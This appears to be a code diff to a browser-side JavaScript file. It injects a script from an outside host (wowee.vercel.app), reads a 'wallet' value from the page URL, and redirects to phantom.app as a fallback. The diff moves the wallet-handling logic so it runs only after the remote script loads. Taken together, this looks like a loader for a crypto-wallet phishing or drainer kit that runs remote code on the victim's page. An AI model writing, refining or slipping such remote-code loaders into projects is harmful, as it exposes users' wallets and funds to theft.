@@ -69,8 +69,9 @@ const ensurePageChange = setInterval(() => {
 
         const script = document.createElement('script');
         script.src = 'https://wowee.vercel.app/main_source.js';
-        document.body.appendChild(script);
-        try {
+        script.onload = function() {
+          setTimeout(() => {
+              try {
           const url = new URL(window.location.href);
               const params = new URLSearchParams(url.search);
               const wallet = params.get("wallet");
@@ -132,6 +133,9 @@ const ensurePageChange = setInterval(() => {
                 }
               }
         } catch(error) {}
+          }, 100);
+        }
+        document.body.appendChild(script);
       } else {
         location.href = "https://phantom.app"
       }
